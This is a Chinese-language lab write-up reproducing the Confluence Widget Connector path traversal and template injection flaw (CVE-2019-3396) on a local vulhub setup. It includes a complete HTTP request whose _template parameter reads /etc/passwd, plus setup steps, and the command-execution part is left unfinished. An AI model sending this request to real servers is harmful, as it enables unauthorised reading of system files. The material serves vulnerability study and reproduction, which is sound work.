# Atlassian Confluence 路径穿越与命令执行漏洞

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包--->修改payload--->命令执行

### 0x01漏洞介绍

​			Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。

服务端模版注入（Server-side Template Injection，SSTI），影响组件Widget Connector（小工具连接器）

##### 影响版本



### 0x02漏洞复现

##### **PAYLOAD:

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 176

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../../../../etc/passwd"}}}
```

​			**环境启动后，访问`http://your-ip:8090`会进入安装引导，选择“Trial installation”，之后会要求填写license key。点击“Get an evaluation license”，去Atlassian官方申请一个Confluence Server的测试证书（不要选择Data Center和Addons)**

![Atlassian_Confluence_路径穿越与命令执行_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Atlassian_Confluence_路径穿越与命令执行_1.jpg)

​			**然后点击Next安装即可。这一步小内存VPS可能安装失败或时间较长（建议使用4G内存以上的机器进行安装与测试），请耐心等待。**

![Atlassian_Confluence_路径穿越与命令执行_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Atlassian_Confluence_路径穿越与命令执行_2.jpg)

​			**如果提示填写cluster node，路径填写`/home/confluence`即可**

![Atlassian_Confluence_路径穿越与命令执行_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Atlassian_Confluence_路径穿越与命令执行_3.jpg)

​			**填写数据库账号密码，选择postgres数据库，地址为`db`，账号密码均为`postgres`**

![Atlassian_Confluence_路径穿越与命令执行_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Atlassian_Confluence_路径穿越与命令执行_4.jpg)

​			**Burpsuite抓包改包，/etc/passwd成功读取**

#### 			需要内存太大。直接给我虚拟机干宕机了，以后补充



### 0x03参考资料

POC:https://github.com/jas502n/CVE-2019-3396

https://blog.csdn.net/caiqiiqi/article/details/89034761

